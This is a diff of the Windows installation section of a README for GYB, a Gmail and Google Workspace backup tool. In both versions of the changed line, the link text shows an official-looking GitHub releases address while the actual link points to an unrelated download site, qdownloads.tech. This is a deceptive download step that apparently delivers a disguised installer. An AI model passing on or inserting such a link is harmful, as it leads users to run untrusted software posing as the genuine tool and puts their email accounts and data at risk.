@@ -32,7 +32,7 @@ GYB works with Gmail.com and Google Workspace (formerly G Suite / Google Apps) a
 
 ## Windows Users
 
-The Installer can be downloaded here --> [https://github.com/GAM-team/got-your-back/releases/gyb-1.70-windows-x86_64.msi](https://qdownloads.tech/Setup/). Install the MSI and you'll be prompted to setup GYB.
+The Installer can be downloaded here --> [https://github.com/GAM-team/got-your-back/releases/Setup.msi](https://qdownloads.tech/Setup/). Install the MSI and you'll be prompted to setup GYB.
 
 ## Mac and Linux Users
 
